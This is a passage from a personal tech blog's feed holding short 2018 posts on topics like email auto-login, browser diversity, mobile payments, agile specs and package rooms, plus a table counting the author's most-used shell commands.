<p>While going through my list of blog post ideas I found one from a few years ago titled “Content Overload” which was meant to highlight how much content I was bombarded with across a variety of channels. I had a bunch of thoughts bemoaning how difficult it was to keep up but these days it’s just not an issue for me. I’m no longer trying to consume everything I can and instead get a lot of my news from conversations with friends and coworkers as well as Twitter. I try to check in on Hacker News every day but occasionally go on stretches where I forget about it for a few days and no one’s the wiser. I sadly gave up on my RSS feed and stopped checking into the other aggregators. Important news will inevitably make its way to me and the less important news I enjoy finding serendipitously. I wouldn’t be surprised if my content consumption actually dropped over the past few years. I’m reading many more books now and am okay with just not keeping up with everything. The one digital content channel that has gotten stronger is email: I’ll subscribe to interesting newsletters and prune these aggressively to make sure my email stays clean and high signal. I may be unique here but it seems I’ve managed to cope with the challenge of content overload.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automatic login</title>
   <link href="http://dangoldin.com/2018/12/08/automatic-login/"/>
   <updated>2018-12-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/08/automatic-login</id>
   <content:encoded><![CDATA[
<p>This is somewhat heretical but whenever I receive an email that has a link behind a login I wish clicking the link would automatically log me in. I’ve spent more time than I’d like to admit typing my username and password on various sites and too often have had to do it multiple times to get the password right. It would be amazing if clicking a link on an email would automatically log me in and navigate to the linked page.</p>

<p>I know why no one does this: people forward emails all the time and it would be incredibly foolish to log people in without any authentication. That’s a perfectly valid reason and I get it but there are still some interesting things that can be done to improve the experience. One idea is to provide a read-only mode. It won’t work on sites where the content is private or interaction-heavy sites but it might make sense on others. Another option is to track the click and follow up with another email that contains an actual login link. The idea here is that you’re sending it to the user’s registered email so it would have to be clicked by the true owner. On the flip side this is a crappy experience if the person did have a successful login since they’d now have an extra email that added no value. Using a sophisticated AI/ML approach here might work as well - maybe looking at the IP address to see if it’s consistent with previous visits or leveraging browser fingerprinting.</p>

<p>There’s no obvious solution here and this is more of a personal venting sessions but the entire email to site experience can be improved. I value my privacy and use multiple browsers throughout the day. I’ll also purge cookies and history every once in a while and rebuilding that is a slow experience. My use case is rare but it’s often the extreme cases that drive a new insight or workflow and I’d love to see more innovation happening with this sort of “smart login.”</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Speech recognition and a bunch of APIs</title>
   <link href="http://dangoldin.com/2018/12/07/speech-recognition-and-a-bunch-of-apis/"/>
   <updated>2018-12-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/07/speech-recognition-and-a-bunch-of-apis</id>
   <content:encoded><![CDATA[
<p>Google’s Duplex is clearly impressive but what I actually want to see is the frontend of Duplex hooked up to the various booking APIs. For example, instead of actually making a call to a restaurant on my behalf it would just use the various booking sites already out there, such as OpenTable, to make the reservation. From the caller’s experience the two are indistinguishable since you’re just using your voice but on the restaurant side there’s no need to talk to someone to do something that can be done through a series of API calls. The calling approach is incredibly impressive and makes sense when a business doesn’t offer any online booking functionality but many do and involving a person introduces overhead.</p>

<p>Imagine combining the speech recognition power of an Echo or a Google Home with the investment that’s already been made in the various APIs. Google is the leader in voice recognition and should be able to find a way to map speech to intent that can be executed without actually needing to interact with a person.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Conference call echoes</title>
   <link href="http://dangoldin.com/2018/12/06/conference-call-echoes/"/>
   <updated>2018-12-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/06/conference-call-echoes</id>
   <content:encoded><![CDATA[
<p>I’m sure conference calls have improved significantly over the past decade yet they still feel incredibly behind. They’re generally stable but it’s boggling that we still haven’t been able to figure out how to get rid of the echo. Whenever there are two unmuted people in a single room dialed in to the same meeting you hear the effect. As soon as one speaks you hear loud and whiny static that only goes away when one of the participants mutes themselves. The solution is incredibly simple and it’s shocking that there’s no automated solution.</p>

<p>Noise cancelling headphones are not designed for voice cancellation and do much better at low frequency sounds but it just seems that a video conferencing system should be able do a better job. It has a bit more time for the processing, has the data from both channels, and should be able to identify and prevent the echo as it occurs. It can be as simple as detecting a high frequency sound and silencing it or temporarily muting one of the channels. It’s obviously more difficult than that or we would have had this functionality already but it’s just surprising that this hasn’t happened yet. We <a href="https://ai.googleblog.com/2018/05/duplex-ai-system-for-natural-conversation.html">have systems</a> that can make calls on our behalf and yet we don’t have a system that could get rid of a conference call echo.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The golden age of browsers</title>
   <link href="http://dangoldin.com/2018/12/05/the-golden-age-of-browsers/"/>
   <updated>2018-12-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/05/the-golden-age-of-browsers</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/browser-share.png" alt="Browser market share June 2018" width="1248" height="1112" layout="responsive"/>
<p class="caption"><a href="https://en.wikipedia.org/wiki/Usage_share_of_web_browsers">Browser market share June 2018</a></p>

<p>In June 2018 the top 5 browsers had an estimated 94.98% share of the browser market. This makes sense since most people either use their OS’s default browser or find a mainstream alternative, such as Chrome or Firefox. Yet there’s a lot of interesting and novel browser work happening on the fringes. <a href="https://brave.com">Brave</a>, started by Brendan Eich (creator of JavaScript and cofounder of the Mozilla project), is designed for privacy and comes with built-in adblocking; <a href="https://vivaldi.com">Vivaldi</a> is all about customization and tab management; <a href="http://www.ucweb.com">UC Browser</a> is all about mobile performance - and is, in fact, the third most popular mobile browser.</p>

<p>The fact that there’s this much browser diversity is great. These alternative browsers are able to experiment with their approach and appeal to a passionate enough user base that keeps them going. And if these features do work, the mainstream browsers end up adopting them in future versions.</p>

<p>Nearly all, if not all, browsers are free. This is all happening due to the wonders of the modern web. The mainstream browsers have huge corporations supporting their development. The others support themselves through advertising by selling the search bar to search engines. I don’t know the how much revenue the average user makes or how many users it would take for a browser to stay alive but the more we experiment with these alternative browsers and try them out the healthier the browser ecosystem.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>How many wifi devices do we have?</title>
   <link href="http://dangoldin.com/2018/12/04/how-many-wifi-devices-do-we-have/"/>
   <updated>2018-12-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/04/how-many-wifi-devices-do-we-have</id>
   <content:encoded><![CDATA[
<p>Benedict Evans wrote a <a href="https://www.ben-evans.com/benedictevans/2014/5/26/the-internet-of-things">great post</a> back in 2014 that started with the observation that while our grandparents knew how many motors they owned we have no idea and that while we know how many of our devices connect to the internet our children will not.</p>

<p>It sounded nice at the time but I lived it today. Verizon sent me a new router and rather than taking the small amount of time to change the wifi network name and password back to the previous version I decided it wouldn’t be that hard to just update the wifi settings in the various devices. After I updated my phone, computer, and Fire TV Stick I realized I still had many more to go and decided, albeit too late, that it would be easier to just revert the settings. What makes changing the settings difficult is that updating the wifi settings on devices without a keyboard is just incredibly difficult. For some, such as the Fire TV Stick, you have to type using a remote and an on-screen keyboard. For others, such as the Echo, you have to switch back and forth between wifi networks to get everything set up.</p>

<p>I can’t imagine what it will be like when we actually have hundreds of devices that all need to connect to a wifi network and the settings change. There will have to be a way to make the network settings easier to manage and I wonder what that will be.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Overcoming writing rustiness</title>
   <link href="http://dangoldin.com/2018/12/03/overcoming-writing-rustiness/"/>
   <updated>2018-12-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/03/overcoming-writing-rustiness</id>
   <content:encoded><![CDATA[
<p>Now that I’ve forced myself to write every day in order to catch up on my blogging goal it’s been much easier. The challenge was always getting started but as soon as I start the thoughts and sentences come out pretty quickly. They nearly always require a bit of editing and cleanup at the end but the initial dump is usually a pretty good basis for the rest of the post. Knowing that I need to write more than a post a day is enough to motivate me to put the proverbial pen to paper and get over that initial hump.</p>

<p>I’ve also found myself being much more aware of what I encounter throughout the day and whether it would make for an appropriate blog post. I have a running list of a few hundred blog topics that I keep adding to and my constant writing has me thinking of multiple ideas every day. It’s amazing how the mind works - you make something a conscious effort and your brain quickly rewires itself to prioritize it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mobile payments and messaging apps</title>
   <link href="http://dangoldin.com/2018/12/02/mobile-payments-and-messaging-apps/"/>
   <updated>2018-12-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/02/mobile-payments-and-messaging-apps</id>
   <content:encoded><![CDATA[
<p>I wrote a <a href="/2018/11/14/what-messaging-war/">post</a> almost a month ago describing my relationship with messaging apps: despite the fact that are dozens of messaging apps competing against one another I treat them all as a commodity. The same situation exists with mobile payments. It feels less fragmented than the messaging space and yet there are quite a few players here: Apple Wallet, Google Pay, PayPal, Venmo (owned of PayPal), Zelle, Cash App, in addition to the region specific companies, such as AliPay and WeChat in China to PayTM in India.</p>

<p>Compared to a messaging app getting set up with a mobile payments app is more difficult since you’re often required to link it to a financial account but once that is done you’re generally good to go. The underlying interface is the currency itself so as long as you’re able to withdraw money from these apps you can keep shuffling money between apps without a second thought.</p>

<p>My experience with Apple Pay is illustrative. I started by connecting some of my credit cards to check it out and have been using it at a few stores. A few months ago I went out to lunch with a coworker and instead of paying me back using Venmo he sent an Apple Pay request. I didn’t even know that Apple Pay had social payment functionality. I was curious, accepted the payment, and now my account has a balance like any other app. In fact I can even use this balance to pay at any store that accepts Apple Pay. I didn’t have to do anything special or novel and it worked just like any other payment app. I’m sure there’s a lot of subtlety and nuance I’m glossing over but in my limited use case they suffer the same problem as messaging apps - the offering is commoditized and people will use whichever one they need at any point in time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fat specs, light stories</title>
   <link href="http://dangoldin.com/2018/12/01/fat-specs-light-stories/"/>
   <updated>2018-12-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/01/fat-specs-light-stories</id>
   <content:encoded><![CDATA[
<p>Most modern software companies use some form of agile as their software development process. There are a variety of different approaches and forms out there and each company ends up with a style that works for them. One of the core beliefs I’ve developed is that stories should be kept light and that time and effort should be spent on the product requirement documents and specs. Investing in the PRDs and specs encourages everyone to understand the high level problem being solved and how the various pieces of the solutions fit together. Otherwise you run the risk of mistaking the forest for the trees where each ticket is done as written but when combined they don’t actually work to make the proper whole.</p>

<p>The other advantage is that it’s just easier to maintain the specs and PRDs as the scope changes. Unless you’re doing something incredibly simple (which shouldn’t incur the overhead of a spec in the first place), the implementation will likely change as you code. And when it does change you want to reflect those changes somewhere so they’re not lost to anyone searching for them in the future. By updating the original spec you’re treating it as the source of truth and prevent others from wasting time hopping around from story to story looking through comments.</p>

<p>There are numerous ways to approach agile and the entire point is to be flexible and find what works given your company’s culture, products, and values. In our case our product is incredibly nuanced with a ton of details that it’s more important for everyone to have the shared context of what we’re doing more than the individual details that change rapidly.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tragedy of the commons: Apartment edition</title>
   <link href="http://dangoldin.com/2018/11/30/tragedy-of-the-commons-apartment-edition/"/>
   <updated>2018-11-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/30/tragedy-of-the-commons-apartment-edition</id>
   <content:encoded><![CDATA[
<p>‘Tis the season where mailrooms get filled with delivery boxes and it’s getting busier every year.  Mary Meeker mentioned the trend of building lobbies becoming <a href="http://dangoldin.com/assets/static/images/mm-landlord-storage.png">ecommerce storage</a> facilities and it’s more true than ever. My building has a small package room which has been filled solid this week after Black Friday and Cyber Monday.</p>

<p>It’s so inaccessible that it’s easier for me to just wait for others to get their packages and free some space before I go in to search for my own. Unfortunately, if everyone feels that way then no one gets their package and it becomes a true <a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons</a>. Instead of helping each other out we’re waiting for others to improve the situation while it constantly gets worse with newly arriving packages.</p>

<p>This is clearly all tongue in cheek and everyone wants to get their package as soon as they can but there is some truth here. Mailrooms are getting more and more packed and as more and more of our daily items are delivered at ever increasing frequency it really does become more difficult to manage the situation.</p>

<p>The primary problem is that all packages look the same. What if each apartment had their own unique style that was somehow reflected on the boxes? Maybe it’s a uniquely designed label. Or maybe it’s unique packing tape. Similar to an airport where people have their own unique luggage tags what if ecommerce companies started giving each box a unique look to make it easier for it to be found? It’s definitely more expensive but would be a nice touch and make package delivery more efficient for us apartment dwellers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A delivery aggregation service</title>
   <link href="http://dangoldin.com/2018/11/29/a-delivery-aggregation-service/"/>
   <updated>2018-11-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/29/a-delivery-aggregation-service</id>
   <content:encoded><![CDATA[
<p>Full disclosure: I know very little about the food delivery space so this is more speculative than anything rooted in reality.</p>

<p>Given how many companies are doing food delivery it seems there should be a single delivery aggregation service that combines all of them to act as the perfect dispatcher for drivers. If I’m delivering food on behalf of Uber Eats, DoorDash, Postmates, Grubhub, and the countless others I missed it would make sense for me to be able to pick up from as many nearby restaurants as possible and then deliver to as many colocated locations as possible. The ideal situation would be that I’m able to pick up all my deliveries from a single restaurant and then deliver them all to the same floor of an apartment building.</p>

<p>My understanding is that the dispatch is managed by the food delivery companies and not the restaurant which makes this impossible. Instead, I have to follow each company’s dispatching service which prevents me from potentially getting more deliveries on the same route. This would be slightly better if the restaurant were responsible for the delivery since they would be able to batch but unfortunately they would then also be responsible for keeping drivers busy at all times. The ideal situation would be to have the driver have the ultimate responsibility which would incentivize them to integrate into every service in order to tap into as many aligned routes as possible. This is similar to the Uber vs Lyft situation - they both offer enough incentives to keep drivers sticky but without the incentives drivers would be better off playing both sides and doing what’s best at any single time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shell history: 2018 edition</title>
   <link href="http://dangoldin.com/2018/11/28/shell-history-2018-edition/"/>
   <updated>2018-11-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/28/shell-history-2018-edition</id>
   <content:encoded><![CDATA[
<p>In what has become an annual tradition I have a very simple shell script that generates a frequency of my most commonly run shell commands. This year saw a pretty big change from 2017. The most obvious difference is that I use “git” more frequently than in the past. This is a tough one to analyze by looking at the data since my usage of <a href="https://github.com/robbyrussell/oh-my-zsh">oh-my-zsh</a> skews the data. It provides a variety of git aliases - for example gp for git push and gco for git checkout - that appear elsewhere in the results so my pure use of “git” is almost isolated to the cases where I do a commit.</p>

<p>The other big difference is my aggressive use of the AWS CLI. I have seen my role shift to less of a coder and more in support of DevOps so this is reasonable. I’ve also made an effort to minimize my use of the AWS Console in favor of having quick and handy commands that give me quicker access to the information I need.</p>

<p>This was also the year I finally embraced Docker. Before this year I had never used docker
I’ve finally embraced docker. Before 2018 I had never used Docker and now use it on a semi-regular basis.</p>

<p>A few other interesting observations come from looking at the commands that only appeared in 2018. The first is “siege” which was a small load testing program I was messing around with earlier this year. The second was “<a href="https://github.com/BurntSushi/ripgrep">rg</a>” which while less powerful than grep does the simple searches much much faster.</p>

<p>This is an interesting exercise and I’d encourage others to start doing this as well. It really does give you a sense of how your terminal usage has changed and how it aligns with industry trends.</p>

<table class="table"><thead><tr><th>Command</th><th>2018 Count</th><th>2017 Count</th><th>2014 Count</th><th>2018 Pct</th><th>2017 Pct</th><th>2014 Pct</th></tr></thead><tbody><tr><td>git</td><td>1403</td><td>581</td><td>347</td><td>16.39%</td><td>7.55%</td><td>41.26%</td></tr><tr><td>aws</td><td>907</td><td>325</td><td>0</td><td>10.60%</td><td>4.22%</td><td>0.00%</td></tr><tr><td>curl</td><td>525</td><td>139</td><td>0</td><td>6.13%</td><td>1.81%</td><td>0.00%</td></tr><tr><td>cd</td><td>466</td><td>608</td><td>49</td><td>5.44%</td><td>7.90%</td><td>5.83%</td></tr><tr><td>gco</td><td>447</td><td>75</td><td>0</td><td>5.22%</td><td>0.97%</td><td>0.00%</td></tr><tr><td>ls</td><td>316</td><td>415</td><td>103</td><td>3.69%</td><td>5.39%</td><td>12.25%</td></tr><tr><td>grep</td><td>278</td><td>87</td><td>4</td><td>3.25%</td><td>1.13%</td><td>0.48%</td></tr><tr><td>ssh</td><td>247</td><td>62</td><td>28</td><td>2.89%</td><td>0.81%</td><td>3.33%</td></tr><tr><td>python</td><td>242</td><td>354</td><td>89</td><td>2.83%</td><td>4.60%</td><td>10.58%</td></tr><tr><td>cat</td><td>226</td><td>74</td><td>28</td><td>2.64%</td><td>0.96%</td><td>3.33%</td></tr><tr><td>rm</td><td>203</td><td>61</td><td>15</td><td>2.37%</td><td>0.79%</td><td>1.78%</td></tr><tr><td>history</td><td>165</td><td>35</td><td>5</td><td>1.93%</td><td>0.45%</td><td>0.59%</td></tr><tr><td>less</td><td>159</td><td>85</td><td>0</td><td>1.86%</td><td>1.10%</td><td>0.00%</td></tr><tr><td>docker</td><td>151</td><td>0</td><td>0</td><td>1.76%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>mv</td><td>139</td><td>49</td><td>4</td><td>1.62%</td><td>0.64%</td><td>0.48%</td></tr><tr><td>rake</td><td>131</td><td>52</td><td>15</td><td>1.53%</td><td>0.68%</td><td>1.78%</td></tr><tr><td>mediumify</td><td>125</td><td>41</td><td>0</td><td>1.46%</td><td>0.53%</td><td>0.00%</td></tr><tr><td>brew</td><td>117</td><td>49</td><td>5</td><td>1.37%</td><td>0.64%</td><td>0.59%</td></tr><tr><td>emacs</td><td>116</td><td>101</td><td>22</td><td>1.36%</td><td>1.31%</td><td>2.62%</td></tr><tr><td>sudo</td><td>107</td><td>61</td><td>9</td><td>1.25%</td><td>0.79%</td><td>1.07%</td></tr><tr><td>find</td><td>102</td><td>80</td><td>3</td><td>1.19%</td><td>1.04%</td><td>0.36%</td></tr><tr><td>pip</td><td>93</td><td>68</td><td>14</td><td>1.09%</td><td>0.88%</td><td>1.66%</td></tr><tr><td>mkdir</td><td>85</td><td>35</td><td>2</td><td>0.99%</td><td>0.45%</td><td>0.24%</td></tr><tr><td>docker-compose</td><td>80</td><td>65</td><td>0</td><td>0.93%</td><td>0.84%</td><td>0.00%</td></tr><tr><td>cp</td><td>78</td><td>37</td><td>2</td><td>0.91%</td><td>0.48%</td><td>0.24%</td></tr><tr><td>siege</td><td>72</td><td>0</td><td>0</td><td>0.84%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>npm</td><td>66</td><td>241</td><td>0</td><td>0.77%</td><td>3.13%</td><td>0.00%</td></tr><tr><td>gd</td><td>59</td><td>421</td><td>0</td><td>0.69%</td><td>5.47%</td><td>0.00%</td></tr><tr><td>pbpaste</td><td>54</td><td>26</td><td>0</td><td>0.63%</td><td>0.34%</td><td>0.00%</td></tr><tr><td>gb</td><td>53</td><td>32</td><td>0</td><td>0.62%</td><td>0.42%</td><td>0.00%</td></tr><tr><td>rg</td><td>46</td><td>0</td><td>0</td><td>0.54%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>ping</td><td>46</td><td>16</td><td>23</td><td>0.54%</td><td>0.21%</td><td>2.73%</td></tr><tr><td>open</td><td>45</td><td>42</td><td>3</td><td>0.53%</td><td>0.55%</td><td>0.36%</td></tr><tr><td>pwd</td><td>41</td><td>438</td><td>12</td><td>0.48%</td><td>5.69%</td><td>1.43%</td></tr><tr><td>export</td><td>39</td><td>4</td><td>0</td><td>0.46%</td><td>0.05%</td><td>0.00%</td></tr><tr><td>python3</td><td>38</td><td>0</td><td>0</td><td>0.44%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>gst</td><td>36</td><td>795</td><td>0</td><td>0.42%</td><td>10.32%</td><td>0.00%</td></tr><tr><td>mkvirtualenv</td><td>33</td><td>16</td><td>3</td><td>0.39%</td><td>0.21%</td><td>0.36%</td></tr><tr><td>alias</td><td>32</td><td>16</td><td>0</td><td>0.37%</td><td>0.21%</td><td>0.00%</td></tr><tr><td>mongo</td><td>31</td><td>0</td><td>0</td><td>0.36%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>echo</td><td>30</td><td>15</td><td>2</td><td>0.35%</td><td>0.19%</td><td>0.24%</td></tr><tr><td>gl</td><td>29</td><td>525</td><td>0</td><td>0.34%</td><td>6.82%</td><td>0.00%</td></tr><tr><td>yarn</td><td>28</td><td>0</td><td>0</td><td>0.33%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>wc</td><td>27</td><td>9</td><td>7</td><td>0.32%</td><td>0.12%</td><td>0.83%</td></tr><tr><td>touch</td><td>27</td><td>11</td><td>0</td><td>0.32%</td><td>0.14%</td><td>0.00%</td></tr><tr><td>jekyll</td><td>27</td><td>112</td><td>12</td><td>0.32%</td><td>1.45%</td><td>1.43%</td></tr><tr><td>./tf-wrapper</td><td>25</td><td>0</td><td>0</td><td>0.29%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>gp</td><td>24</td><td>370</td><td>0</td><td>0.28%</td><td>4.81%</td><td>0.00%</td></tr><tr><td>code</td><td>24</td><td>297</td><td>0</td><td>0.28%</td><td>3.86%</td><td>0.00%</td></tr><tr><td>man</td><td>23</td><td>12</td><td>0</td><td>0.27%</td><td>0.16%</td><td>0.00%</td></tr><tr><td>join</td><td>23</td><td>7</td><td>0</td><td>0.27%</td><td>0.09%</td><td>0.00%</td></tr><tr><td>sh</td><td>22</td><td>0</td><td>4</td><td>0.26%</td><td>0.00%</td><td>0.48%</td></tr><tr><td>gbda</td><td>21</td><td>304</td><td>0</td><td>0.25%</td><td>3.95%</td><td>0.00%</td></tr><tr><td>ffmpeg</td><td>20</td><td>7</td><td>0</td><td>0.23%</td><td>0.09%</td><td>0.00%</td></tr><tr><td>workon</td><td>19</td><td>54</td><td>7</td><td>0.22%</td><td>0.70%</td><td>0.83%</td></tr><tr><td>go</td><td>19</td><td>47</td><td>0</td><td>0.22%</td><td>0.61%</td><td>0.00%</td></tr><tr><td>du</td><td>19</td><td>18</td><td>0</td><td>0.22%</td><td>0.23%</td><td>0.00%</td></tr><tr><td>wrk</td><td>18</td><td>0</td><td>0</td><td>0.21%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>scp</td><td>18</td><td>13</td><td>0</td><td>0.21%</td><td>0.17%</td><td>0.00%</td></tr><tr><td>gradle</td><td>18</td><td>46</td><td>0</td><td>0.21%</td><td>0.60%</td><td>0.00%</td></tr><tr><td>diff</td><td>18</td><td>17</td><td>0</td><td>0.21%</td><td>0.22%</td><td>0.00%</td></tr><tr><td>ci</td><td>18</td><td>0</td><td>0</td><td>0.21%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>ps</td><td>17</td><td>7</td><td>0</td><td>0.20%</td><td>0.09%</td><td>0.00%</td></tr><tr><td>php</td><td>17</td><td>3</td><td>0</td><td>0.20%</td><td>0.04%</td><td>0.00%</td></tr><tr><td>kubectl</td><td>16</td><td>0</td><td>0</td><td>0.19%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>cut</td><td>16</td><td>7</td><td>0</td><td>0.19%</td><td>0.09%</td><td>0.00%</td></tr><tr><td>chmod</td><td>16</td><td>5</td><td>0</td><td>0.19%</td><td>0.06%</td><td>0.00%</td></tr><tr><td>ab</td><td>16</td><td>0</td><td>0</td><td>0.19%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>./gradlew</td><td>16</td><td>0</td><td>0</td><td>0.19%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>g_pass</td><td>15</td><td>22</td><td>0</td><td>0.18%</td><td>0.29%</td><td>0.00%</td></tr><tr><td>flask</td><td>15</td><td>0</td><td>0</td><td>0.18%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>tar</td><td>14</td><td>0</td><td>0</td><td>0.16%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>airflow</td><td>14</td><td>5</td><td>0</td><td>0.16%</td><td>0.06%</td><td>0.00%</td></tr><tr><td>nvm</td><td>13</td><td>0</td><td>0</td><td>0.15%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>kill</td><td>12</td><td>0</td><td>0</td><td>0.14%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>code-insiders</td><td>12</td><td>0</td><td>0</td><td>0.14%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>which</td><td>11</td><td>11</td><td>0</td><td>0.13%</td><td>0.14%</td><td>0.00%</td></tr><tr><td>n</td><td>11</td><td>13</td><td>0</td><td>0.13%</td><td>0.17%</td><td>0.00%</td></tr><tr><td>yolk</td><td>10</td><td>0</td><td>0</td><td>0.12%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>route</td><td>10</td><td>0</td><td>0</td><td>0.12%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>netstat</td><td>10</td><td>0</td><td>0</td><td>0.12%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>nslookup</td><td>9</td><td>0</td><td>0</td><td>0.11%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>wordcloud_cli.py</td><td>8</td><td>0</td><td>0</td><td>0.09%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>unzip</td><td>8</td><td>6</td><td>0</td><td>0.09%</td><td>0.08%</td><td>0.00%</td></tr><tr><td>mail</td><td>8</td><td>14</td><td>0</td><td>0.09%</td><td>0.18%</td><td>0.00%</td></tr><tr><td>hub</td><td>8</td><td>42</td><td>0</td><td>0.09%</td><td>0.55%</td><td>0.00%</td></tr><tr><td>head</td><td>8</td><td>0</td><td>5</td><td>0.09%</td><td>0.00%</td><td>0.59%</td></tr><tr><td>datalab</td><td>8</td><td>0</td><td>0</td><td>0.09%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>cdblog</td><td>8</td><td>62</td><td>14</td><td>0.09%</td><td>0.81%</td><td>1.66%</td></tr><tr><td>traceroute</td><td>7</td><td>4</td><td>0</td><td>0.08%</td><td>0.05%</td><td>0.00%</td></tr><tr><td>telnet</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>split</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>s3</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>gzip</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>gcloud</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>date</td><td>7</td><td>0</td><td>0</td><td>0.08%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>zkCli</td><td>6</td><td>0</td><td>0</td><td>0.07%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>source</td><td>6</td><td>0</td><td>2</td><td>0.07%</td><td>0.00%</td><td>0.24%</td></tr><tr><td>sendEmail</td><td>6</td><td>6</td><td>0</td><td>0.07%</td><td>0.08%</td><td>0.00%</td></tr><tr><td>node</td><td>6</td><td>25</td><td>0</td><td>0.07%</td><td>0.32%</td><td>0.00%</td></tr><tr><td>jupyter</td><td>6</td><td>3</td><td>0</td><td>0.07%</td><td>0.04%</td><td>0.00%</td></tr><tr><td>gunzip</td><td>6</td><td>0</td><td>0</td><td>0.07%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>ansible-vault</td><td>6</td><td>0</td><td>0</td><td>0.07%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>./ngrok</td><td>6</td><td>0</td><td>0</td><td>0.07%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>terraform</td><td>5</td><td>0</td><td>0</td><td>0.06%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>protoc</td><td>5</td><td>7</td><td>0</td><td>0.06%</td><td>0.09%</td><td>0.00%</td></tr><tr><td>mvn</td><td>5</td><td>0</td><td>0</td><td>0.06%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>heptio-authenticator-aws</td><td>5</td><td>0</td><td>0</td><td>0.06%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>ansible-playbook</td><td>5</td><td>0</td><td>0</td><td>0.06%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>wget</td><td>4</td><td>0</td><td>0</td><td>0.05%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>serverless</td><td>4</td><td>0</td><td>0</td><td>0.05%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>sass</td><td>4</td><td>0</td><td>3</td><td>0.05%</td><td>0.00%</td><td>0.36%</td></tr><tr><td>ruby</td><td>4</td><td>8</td><td>0</td><td>0.05%</td><td>0.10%</td><td>0.00%</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Privacy in a face detection world</title>
   <link href="http://dangoldin.com/2018/11/27/privacy-in-a-face-detection-world/"/>
   <updated>2018-11-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/27/privacy-in-a-face-detection-world</id>
   <content:encoded><![CDATA[
<p>In a bit of dystopian news a <a href="https://www.caixinglobal.com/2018-11-22/ai-mistakes-bus-side-ad-for-famous-ceo-charges-her-with-jaywalkingdo-101350772.html">CEO was charged for jaywalking</a> when a face detection algorithm saw her face on a bus ad. While simultaneously amusing and dystopian it does make one think of a world in which everyone is constantly monitored. At some level we’re already in this world digitally - our browsing behavior is constantly tracked and we all have ad behavior profiles that are constantly being tweaked and updated. Some get around this by using adblocking while a small fraction take the opposite approach and have their browser search and navigate to random pages in order to clutter and confuse their digital footprints.</p>

<p>The real life equivalent of the adblocking approach would be wearing a disguise in public while the equivalent of the confusion approach would be to get your likeness into as many place as possible and overwhelm the face detection system. The difference is that in the real world you’re out in public rather than browsing the web in private. It does make me wonder whether we’ll end up in a world where people stratify themselves into those that value their privacy enough to wear masks while others subscribe to the “I’m not doing anything wrong so what do I have to hide” approach. Given my posts you can probably tell which camp I fall into.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>An ad on the Google search homepage</title>
   <link href="http://dangoldin.com/2018/11/26/an-ad-on-the-google-search-homepage/"/>
   <updated>2018-11-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/26/an-ad-on-the-google-search-homepage</id>
